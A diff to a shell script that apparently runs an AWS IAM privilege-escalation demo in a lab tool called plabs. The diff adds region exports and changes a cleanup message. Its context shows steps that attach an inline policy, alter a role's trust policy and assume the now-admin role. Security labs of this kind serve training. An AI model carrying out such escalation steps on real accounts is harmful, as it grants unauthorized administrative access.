@@ -117,6 +117,7 @@ echo -e "${YELLOW}Step 2: Verifying starting user identity${NC}"
 # [EXPLOIT] Verify starting user is who we expect
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -134,6 +135,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -233,6 +235,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 8: Verifying inline policy addition${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Updated inline policies on target role:"
 show_cmd "ReadOnly" "aws iam list-role-policies --role-name $TARGET_ROLE --query 'PolicyNames' --output text"
 UPDATED_POLICIES=$(aws iam list-role-policies \
@@ -295,6 +298,7 @@ echo -e "${GREEN}✓ IAM changes propagated${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying trust policy modification${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
 UPDATED_TRUST_POLICY=$(aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
 echo "Updated trust policy:"
@@ -322,6 +326,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.
 export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify target role assumption
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -400,7 +405,7 @@ echo "This is because the trust policy itself grants the assumption capability."
 
 echo -e "\n${RED}⚠ Warning: The target role now has admin permissions and a modified trust policy!${NC}"
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
